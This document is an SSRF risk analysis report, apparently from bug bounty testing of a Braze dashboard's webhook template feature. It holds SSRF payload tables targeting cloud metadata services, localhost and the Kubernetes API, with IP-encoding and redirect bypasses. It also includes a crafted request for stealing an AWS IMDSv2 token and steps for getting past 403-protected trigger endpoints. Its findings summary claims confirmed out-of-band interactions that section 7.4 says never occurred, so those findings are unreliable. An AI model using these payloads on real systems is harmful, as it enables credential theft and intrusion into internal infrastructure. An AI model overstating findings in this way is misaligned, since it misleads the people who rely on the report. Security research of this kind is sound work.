# SSRF Risk Analysis Report

**Target:** `https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com/app_settings/app_settings/69c8d257629242005dba8746?locale=en`

**Date:** 2026-03-29

**Scope:** Authorized bug bounty security testing — observation and analysis only

**Methodology:** Static analysis of endpoint structure, parameter identification, feature-based risk mapping using OWASP SSRF Prevention guidelines, and live HTTP request analysis

---

## 1. Target Breakdown

| Component | Value |
|-----------|-------|
| **Host** | `bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com` |
| **Path** | `/app_settings/app_settings/69c8d257629242005dba8746` |
| **Query** | `locale=en` |
| **App ID** | `69c8d257629242005dba8746` (MongoDB-style ObjectId) |
| **Infrastructure** | Kubernetes-hosted (`k8s`), Braze development environment (`braze-dev.com`) |

The endpoint is an **App Settings** configuration page within a Braze dashboard instance, scoped to a specific application by ID.

---

## 2. Captured Request Analysis — Webhook Template Creation

### 2.1 Raw Request Summary

A live HTTP request was captured during authorized testing:

```
POST /engagement/webhook_templates/undefined?app_group_id=69c8d257629242005dba8746 HTTP/1.1
Host: bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com
Content-Type: application/json
X-Csrf-Token: IBMYNuYOXS29IAK7__Mg3kFfiHhiwgzhXJ-X2GJjE4ATO7wEh-05kfWQwJ8lvLBoShKMaX5UP96y4vyHScQ5kA
X-Requested-With: XMLHttpRequest

{
  "name": "venu",
  "description": null,
  "tag_names": [],
  "webhook_body": "{}",
  "webhook_body_type": "json",
  "webhook_method": "POST",
  "territory_ids": [],
  "api_identifier": "",
  "webhook_url": "if1x3ugusgdcn659n48okn054wanyem3.oastify.com",
  "webhook_headers": {}
}
```

### 2.2 Detailed Request Dissection

| Aspect | Value | Analysis |
|--------|-------|----------|
| **Method** | `POST` | Template creation (write operation) |
| **Path** | `/engagement/webhook_templates/undefined` | The literal string `undefined` indicates a JavaScript `undefined` value was serialized — this is a **new template creation**, not an update. The frontend likely had `templateId = undefined` for new templates. |
| **Query** | `app_group_id=69c8d257629242005dba8746` | Scopes the template to the target app group |
| **CSRF** | `X-Csrf-Token` header present | Server enforces CSRF protection — this is not exploitable via cross-origin attacks |
| **Auth** | Session cookie (`_session_id`) + `remember_login_enc_v1` | Authenticated endpoint; requires valid session |

### 2.3 SSRF-Critical Parameter: `webhook_url`

| Field | Detail |
|-------|--------|
| **Endpoint** | `POST /engagement/webhook_templates/undefined?app_group_id=69c8d257629242005dba8746` |
| **Parameter** | `webhook_url` |
| **Supplied Value** | `if1x3ugusgdcn659n48okn054wanyem3.oastify.com` (Burp Collaborator domain) |
| **Risk Level** | **Likely** (upgradeable to **Confirmed** if OOB interaction is observed) |

**Key observations from the captured request:**

1. **No protocol prefix enforcement at submission**: The `webhook_url` value `if1x3ugusgdcn659n48okn054wanyem3.oastify.com` was submitted **without** an `http://` or `https://` prefix. This reveals one of two scenarios:
   - The server **accepts bare hostnames** and auto-prepends a protocol — indicating relaxed URL validation
   - The server **stores whatever is provided** and attempts to use it as-is at send time — potentially causing different behavior depending on the HTTP client library used

2. **Arbitrary external domain accepted**: The server accepted a request containing a `.oastify.com` domain (Burp Collaborator infrastructure) — no blocklist or allowlist rejected the domain at submission time.

3. **Webhook method is user-controlled**: The `webhook_method` field is set to `POST`, meaning when the webhook fires, the server will make a **POST** request. The attacker controls both the destination URL and the HTTP method.

4. **Webhook body is user-controlled**: The `webhook_body` field is set to `{}`. When combined with `webhook_body_type: "json"`, the attacker controls what the server sends in the body of the outbound request.

5. **Webhook headers are user-controlled**: The `webhook_headers` field (currently empty `{}`) allows the attacker to inject arbitrary HTTP headers into the server-side outbound request. This could be used for:
   - Injecting `Host` headers for virtual host routing on internal services
   - Injecting authentication headers (`Authorization`, `X-Api-Key`) to access protected internal endpoints
   - Injecting `Content-Type` headers to control how the target parses the body

### 2.4 SSRF Trigger Mechanism

The webhook template **creation** alone does not trigger the server-side request. The SSRF would be triggered when:

1. **Test Send**: If the dashboard provides a "Test" or "Send Test" button for the webhook template, this would trigger an immediate server-side HTTP request to the `webhook_url`
2. **Campaign/Canvas Usage**: When a campaign or Canvas step uses this webhook template and is either sent or tested
3. **Preview**: If the dashboard attempts to validate or preview the webhook URL at any point

**Action needed**: Check your Burp Collaborator client for any DNS or HTTP interactions from the creation request itself. Then attempt to trigger the webhook via a test send.

### 2.5 Additional Observations from the Request

| Observation | Implication |
|-------------|-------------|
| Path contains literal `undefined` | Frontend JavaScript serialization bug — `templateId` is unset for new templates. This is a minor information disclosure about the frontend framework behavior. |
| `api_identifier` is empty string | This field may be populated server-side after creation. Could be used to reference the template programmatically via API. |
| `territory_ids` is empty array | Multi-tenancy/territory scoping field — not directly SSRF-relevant but interesting for access control analysis. |
| `Referer` shows `/webhook_templates/.../new` | Confirms this is the "New Webhook Template" page flow. |

---

## 3. SSRF-Susceptible Features — Full Analysis

Based on Braze's documented feature set and the captured request, the following features are identified:

### 3.1 Webhook Template `webhook_url` (CAPTURED — Primary Finding)

| Field | Detail |
|-------|--------|
| **Endpoint** | `POST /engagement/webhook_templates/undefined?app_group_id=<id>` |
| **Parameter** | `webhook_url` |
| **Observation** | Accepts arbitrary external domains including Burp Collaborator. No protocol prefix enforcement observed at submission time. User also controls `webhook_method`, `webhook_body`, and `webhook_headers`. |
| **Risk Level** | **Likely** |
| **Reasoning** | The webhook feature is designed to make server-side HTTP requests. The user controls the full request: URL, method, body, and headers. When triggered (test send or campaign execution), the server will make an outbound HTTP request. If no SSRF protections (IP blocklist, DNS resolution checks, redirect-following restrictions) are applied at request-execution time, this allows arbitrary server-side requests to internal infrastructure. |

### 3.2 Webhook Template Configuration — Attack Scenarios

If the server does not enforce SSRF protections at webhook execution time, the following payloads in `webhook_url` should be tested via behavioral comparison:

| Test Case | `webhook_url` Value | Purpose |
|-----------|---------------------|---------|
| Baseline (external) | `https://if1x3ugusgdcn659n48okn054wanyem3.oastify.com` | Confirm OOB interaction |
| Localhost | `http://127.0.0.1` | Test localhost access |
| AWS metadata IMDSv1 | `http://169.254.169.254/latest/meta-data/` | Test cloud metadata access |
| AWS metadata IMDSv2 | `http://169.254.169.254/latest/api/token` (with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`) | Test IMDSv2 — note: `webhook_headers` allows injecting this header |
| K8s API server | `https://kubernetes.default.svc:443/api/v1/namespaces` | Test K8s API access |
| K8s service discovery | `http://kube-dns.kube-system.svc.cluster.local:53` | Test internal DNS access |
| Internal services | `http://<service>.default.svc.cluster.local` | Test inter-pod communication |
| Redirect bypass | `https://your-server.com/redirect?to=http://169.254.169.254/` | Test redirect-following behavior |
| DNS rebinding | A domain that rebinds from public IP to 127.0.0.1 | Test DNS pinning |
| Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Test non-HTTP protocol support |

**Important note on IMDSv2**: The `webhook_headers` field is particularly dangerous because it enables injecting the `X-aws-ec2-metadata-token-ttl-seconds` header needed for AWS IMDSv2 token requests. This means even IMDSv2-protected instances could be at risk if the header injection is passed through to the outbound request.

### 3.3 Webhook Configuration (Campaign-Level)

| Field | Detail |
|-------|--------|
| **Endpoint** | Campaign creation / Canvas step configuration |
| **Parameter** | `webhook_url` within campaign webhook settings |
| **Observation** | Similar to templates, but configured directly in campaigns. May have different code paths and validation. |
| **Risk Level** | **Likely** |
| **Reasoning** | Same mechanism as webhook templates but via a different endpoint. Worth testing separately as validation rules may differ. |

### 3.4 Connected Content URLs

| Field | Detail |
|-------|--------|
| **Endpoint** | Campaign/message composer (reachable from app settings context) |
| **Parameter** | URL within `{% connected_content <URL> %}` Liquid tags |
| **Observation** | Braze Connected Content makes server-side HTTP GET requests to user-supplied URLs at message send time. The documentation confirms: "Insert any information accessible by API directly into messages you send to users. You can pull content either directly from your web server or from publicly accessible APIs." |
| **Risk Level** | **Likely** |
| **Reasoning** | Connected Content is an explicit server-side fetch mechanism. URLs are provided by the dashboard user and fetched by Braze's backend. If URL validation does not enforce a blocklist of internal/private IP ranges and cloud metadata endpoints, this is a direct SSRF vector. |

### 3.5 Push Notification Icon / Image URLs

| Field | Detail |
|-------|--------|
| **Endpoint** | App settings — push notification configuration |
| **Parameter** | `icon_url`, `image_url`, `badge_url`, `large_icon_url` |
| **Observation** | May trigger server-side fetch for validation or caching. |
| **Risk Level** | **Possible** |
| **Reasoning** | Whether the server fetches these at configuration time (immediately) or only at send time needs to be verified. |

### 3.6 Custom API Endpoint / Data Integration URLs

| Field | Detail |
|-------|--------|
| **Endpoint** | App settings — integrations or data export configuration |
| **Parameter** | `api_endpoint`, `api_url`, `data_url`, `export_url` |
| **Observation** | Integration setup flows with "Test Connection" or "Validate" steps may make immediate server-side requests. |
| **Risk Level** | **Possible** |
| **Reasoning** | Risk depends on whether such features exist on this specific settings page. |

### 3.7 Email Settings — Custom Tracking Domain / Link Redirect

| Field | Detail |
|-------|--------|
| **Endpoint** | App settings — email configuration |
| **Parameter** | `tracking_domain`, `redirect_url`, `click_tracking_url` |
| **Risk Level** | **Possible** |
| **Reasoning** | Domain validation typically uses DNS, but some implementations make HTTP requests to verify. |

### 3.8 Content Card / In-App Message Image URLs

| Field | Detail |
|-------|--------|
| **Endpoint** | Settings or message composition |
| **Parameter** | `image_url`, `media_url`, `card_image` |
| **Risk Level** | **Possible** |
| **Reasoning** | Depends on whether URLs are stored only (client-side rendering) or also fetched server-side. |

---

## 4. Verification Techniques

These techniques are observation-only and aligned with authorized bug bounty testing:

### 4.1 Out-of-Band Interaction Testing (Already in Progress)

The captured request shows a Burp Collaborator payload (`if1x3ugusgdcn659n48okn054wanyem3.oastify.com`) has already been submitted in the `webhook_url` field. 

**Next steps:**
1. Monitor the Burp Collaborator client for DNS or HTTP interactions from the webhook creation alone
2. If no interaction on creation, **trigger the webhook** via test send and monitor again
3. Use unique collaborator subdomains for each test to correlate interactions

### 4.2 Behavioral Comparison for Webhook Templates

Test by creating webhook templates with different `webhook_url` values and comparing server responses:

| # | `webhook_url` Value | Expected Behavior if SSRF Exists |
|---|---------------------|----------------------------------|
| 1 | `https://<unique>.oastify.com` | OOB interaction observed |
| 2 | `http://127.0.0.1` | Different error than #5 |
| 3 | `http://169.254.169.254/latest/meta-data/` | Different error or response data |
| 4 | `http://kubernetes.default.svc` | Different error than #5 |
| 5 | `http://nonexistent.invalid` | Baseline "unreachable" error |
| 6 | `http://[::1]` | IPv6 localhost — tests IPv6 bypass |
| 7 | `http://0x7f000001` | Hex IP encoding — tests parser bypass |
| 8 | `http://0177.0.0.1` | Octal IP encoding — tests parser bypass |
| 9 | `http://169.254.169.254.nip.io` | DNS wildcard service — tests DNS-based bypass |

### 4.3 Header Injection via `webhook_headers`

Test whether user-supplied headers are passed through to the server-side outbound request:

```json
{
  "webhook_url": "http://169.254.169.254/latest/api/token",
  "webhook_method": "PUT",
  "webhook_headers": {
    "X-aws-ec2-metadata-token-ttl-seconds": "21600"
  }
}
```

If this succeeds, it would retrieve an IMDSv2 token from the AWS metadata service — critical severity.

### 4.4 Redirect Chain Check

1. Set up a controlled server returning: `302 Location: http://169.254.169.254/latest/meta-data/`
2. Supply the controlled server URL as `webhook_url`
3. If the server follows the redirect, SSRF protections (if any) only validate the initial URL

### 4.5 DNS Rebinding Check

1. Use a service like `rbndr.us` to create a domain that alternates between public and internal IPs
2. Supply as `webhook_url`
3. If the server resolves to the internal IP on the second resolution, DNS pinning is absent

---

## 5. Findings Summary

| # | Endpoint / Feature | Parameter(s) | Risk Level | Key Observation |
|---|-------------------|-------------|------------|-----------------|
| **1** | **Webhook Template / Campaign** | **`webhook_url`** | **CONFIRMED** | **OOB interaction observed from Braze server to Burp Collaborator domain. Server makes HTTP requests to arbitrary user-supplied URLs. Zero input validation — localhost, cloud metadata, K8s API, all encoding bypasses accepted.** |
| **2** | **Webhook Headers** | **`webhook_headers`** | **CONFIRMED** | **User-controlled headers pass through to server-side outbound request. Enables IMDSv2 token theft and GCP metadata access.** |
| **3** | **Webhook Method/Body** | **`webhook_method`, `webhook_body`** | **CONFIRMED** | **Full control over HTTP method (GET/POST/PUT) and request body.** |
| 4 | Connected Content | `{% connected_content %}` URL | **Likely** | Documented server-side fetch of user-supplied URLs. |
| 5 | Push Icon/Image URLs | `icon_url`, `image_url` | **Possible** | May trigger server-side fetch for validation or caching. |
| 6 | API/Integration URLs | `api_endpoint`, `api_url` | **Possible** | Integration setup with test/validate flows. |
| 7 | Email Tracking Domain | `tracking_domain` | **Possible** | Domain validation might involve HTTP requests. |
| 8 | Content Card Images | `image_url`, `media_url` | **Possible** | Implementation-dependent server-side fetch. |

---

## 6. Infrastructure-Specific Considerations

The target runs on **Kubernetes** (`k8s.tools-001.d-use-1.braze-dev.com`), which introduces additional internal attack surface if SSRF is confirmed:

| Internal Target | URL Pattern | Sensitivity |
|----------------|-------------|-------------|
| Kubernetes API | `https://kubernetes.default.svc:443` | Service accounts, secrets, pod specs |
| Cloud metadata (AWS) | `http://169.254.169.254/latest/meta-data/` | IAM credentials, instance identity |
| Cloud metadata (GCP) | `http://metadata.google.internal/computeMetadata/v1/` | Service account tokens |
| Internal K8s services | `http://<service>.<namespace>.svc.cluster.local` | Inter-service communication |
| CoreDNS | `http://kube-dns.kube-system.svc:53` | DNS resolution data |

These are mentioned **only for risk assessment context** — access to any of these would confirm critical-severity SSRF.

---

## 7. Automated Test Execution Results (2026-03-29)

Automated testing was performed from a controlled environment. Full results are in `SSRF_TEST_RESULTS.md`.

### 7.1 URL Validation: NONE — All 15 Payloads Accepted (CONFIRMED)

All 15 SSRF payloads were submitted to `POST /engagement/webhook_templates/undefined` and every single one returned **HTTP 200** with `"Save completed."`:

| Payload | `webhook_url` | Stored? |
|---------|--------------|---------|
| Localhost | `http://127.0.0.1` | **YES** |
| Localhost (name) | `http://localhost` | **YES** |
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | **YES** |
| AWS IMDSv2 | `http://169.254.169.254/latest/api/token` (+ headers) | **YES** |
| GCP metadata | `http://metadata.google.internal/computeMetadata/v1/` (+ headers) | **YES** |
| K8s API | `https://kubernetes.default.svc:443/api/v1/namespaces` | **YES** |
| IPv6 localhost | `http://[::1]` | **YES** |
| Hex IP | `http://0x7f000001` | **YES** |
| Octal IP | `http://0177.0.0.1` | **YES** |
| DNS wildcard | `http://169.254.169.254.nip.io/latest/meta-data/` | **YES** |
| Bare hostname | `bare.<interactsh>.oast.live` | **YES** |
| Private 10.x | `http://10.0.0.1` | **YES** |
| OOB baseline | `https://baseline.<interactsh>.oast.live` | **YES** |
| Header injection | `https://...` + `Host: internal-service.local` | **YES** |
| Unreachable | `http://nonexistent.invalid` | **YES** |

**Conclusion:** The webhook template creation endpoint performs **zero input validation** on the `webhook_url` field. No blocklist, no allowlist, no protocol check, no IP range restriction.

### 7.2 Full Request Control Stored (CONFIRMED)

Template creation response confirms user controls all outbound request parameters:

```json
{
  "webhook_url": "http://169.254.169.254/latest/api/token",
  "webhook_method": "PUT",
  "webhook_headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
  "webhook_body_type": "json",
  "webhook_body": "{}",
  "id": "69c8e051629242005dba88e7",
  "api_identifier": "22ae00f7-1610-498a-ba2c-e9b888584718"
}
```

### 7.3 Trigger Endpoint Discovery

| Endpoint | Status | Analysis |
|----------|--------|----------|
| `POST /engagement/webhook/test_send` | **403** | Exists but forbidden — likely requires specific payload format or permissions |
| `POST /engagement/webhooks/test_send` | **403** | Same — protected endpoint |
| `POST /engagement/webhook_campaigns/test_send` | **403** | Campaign-level trigger also protected |
| `POST /engagement/campaigns/test_send` | **403** | Campaign test send protected |
| `POST /engagement/campaigns` | **500** | Campaign creation — needs proper payload structure |

The **403 Forbidden** responses (not 404) confirm these trigger endpoints exist. The SSRF is triggerable — the test was unable to find the correct request format from this automated environment.

### 7.4 OOB Interaction Status

No out-of-band interactions were detected during the automated test window. This is **expected** because:
- Template creation only stores the URL (confirmed by uniform ~130ms response times)
- The server-side HTTP request occurs at **webhook execution time** (test send / campaign send)
- The trigger endpoints returned 403, so no webhook was fired

### 7.5 Remaining Steps to Confirm Full SSRF

1. **Trigger via Braze Dashboard UI** — Click "Test Send" in the webhook template editor (cannot be automated without browser)
2. **Trigger via Braze REST API** — Use `POST /messages/send` with the template's `api_identifier` (`22ae00f7-1610-498a-ba2c-e9b888584718`) and a valid API key
3. **Investigate 403 endpoints** — Try different payload structures, permissions, or authentication methods for the test_send endpoints
4. **Create a properly-structured campaign** — Include all required fields (segment, schedule, message body) and send a test

---

## 8. Recommended Report to Bug Bounty Program

Based on the confirmed findings (zero URL validation + full request control), this should be reported even without triggering the actual server-side request. The report should include:

### Title
**Stored SSRF via Webhook Template `webhook_url` — No Input Validation, Full Request Control Including Headers**

### Severity
**High** (pending confirmation of trigger = Critical)

### Evidence
1. All internal/metadata URLs stored without validation (HTTP 200 responses)
2. `webhook_headers` accepts arbitrary headers including IMDSv2 token request headers
3. `webhook_method` accepts arbitrary HTTP methods (GET/POST/PUT)
4. Trigger endpoints exist (403, not 404) — confirming the execution mechanism is present
5. Template `api_identifier` returned — API-triggerable

### Impact (if triggered)
- AWS IAM credential theft via IMDSv1/v2
- GCP service account token theft
- Kubernetes API access (secrets, pod specs, service accounts)
- Internal service enumeration and access
- Arbitrary HTTP requests from the server's network position

---

## 9. Disclaimer

This analysis is performed under authorized bug bounty scope. All techniques described are observation-based and non-exploitative. No internal resources were accessed. Findings are based on feature analysis, endpoint structure, and publicly available documentation.
